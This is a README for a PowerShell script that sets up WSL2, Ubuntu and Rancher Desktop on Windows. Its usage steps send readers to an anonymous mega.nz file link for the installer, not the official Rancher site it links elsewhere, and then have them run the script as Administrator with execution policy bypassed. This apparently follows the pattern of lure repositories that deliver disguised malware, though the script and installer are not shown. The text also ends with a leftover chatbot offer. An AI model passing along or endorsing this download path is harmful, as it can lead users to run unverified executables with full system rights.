# Windows WSL + Ubuntu + Rancher Desktop Setup Script

This repository contains a **PowerShell automation script** (`setup-wsl.ps1`) to prepare a Windows PC for WSL2, install Ubuntu, and then install [Rancher Desktop](https://rancherdesktop.io/) from a local installer.  
It is designed for **one-click setup**: detects prerequisites, enables Windows features, auto-resumes after reboot, and installs everything with clear status messages.

---

## Features

✅ Detects if CPU & BIOS virtualization (VT-x / AMD-V) are enabled  
✅ Enables required Windows features: **WSL** and **VirtualMachinePlatform**  
✅ Installs or updates **WSL2 kernel**  
✅ Installs **Ubuntu** (via `wsl --install` or offline `.appx` if provided)  
✅ Installs **Rancher Desktop** (MSI/EXE in same folder)  
✅ Supports **silent install** (falls back to interactive if not supported)  
✅ Optional auto-config for Rancher Desktop: sets **dockerd (moby)** and disables **Kubernetes**  
✅ Auto-resumes after reboot if system features required restart  
✅ Generates a **log file** and end-of-run **summary popup**  

---

## Requirements

- Windows 10 2004+ (build 19041) or Windows 11  
- CPU with **Intel VT-x** or **AMD-V** virtualization support  
- Virtualization **enabled in BIOS/UEFI**  
- Administrator privileges to run the script  
- Rancher Desktop installer (`.msi` or `.exe`) in the same folder as the script  

---

## Usage

1. Clone/download this repo.  
2. Place your **Rancher Desktop installer** (`Rancher.Desktop-x.y.z.msi` or `.exe`) link to app: https://mega.nz/file/4gRFTIiK#kJ_FhoG_xHgo_rXxTMEAYkZfVwuQb_UMrM6A7GYnP3Q  in the same folder as `setup-wsl.ps1`.  
3. Open **PowerShell as Administrator**.  
4. Run:

   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   .\setup-wsl.ps1 -ConfigureRancher
-ConfigureRancher (optional) tries to set dockerd (moby) and disable Kubernetes automatically using rdctl (best-effort).

If Windows features get enabled, it will ask for reboot and auto-resume afterwards.

## Optional flags

### Offline Ubuntu:

.\setup-wsl.ps1 -OfflineAppx .\Ubuntu_22.04.appx

### Prefer interactive installers:

.\setup-wsl.ps1 -InteractiveInstall

### Skip any extra non-Rancher installer in the folder:

.\setup-wsl.ps1 -SkipAppInstall

### Force immediate reboot when features changed:

.\setup-wsl.ps1 -ForceReboot

## Notes

BIOS VT-x/AMD-V cannot be enabled by any Windows script. This script detects and reports it clearly.

Silent install is used when supported; if not, the script falls back to interactive so you can click through.

After Rancher Desktop installs, first launch may take a minute to initialize the VM; the script doesn’t block on that, but with -ConfigureRancher it will try rdctl if available.

If you want, I can also add:

Creation of a sensible %UserProfile%\.wslconfig (CPU/RAM limits),

A first-run smoke test: docker run hello-world via Rancher Desktop (moby) to confirm Docker API is up.
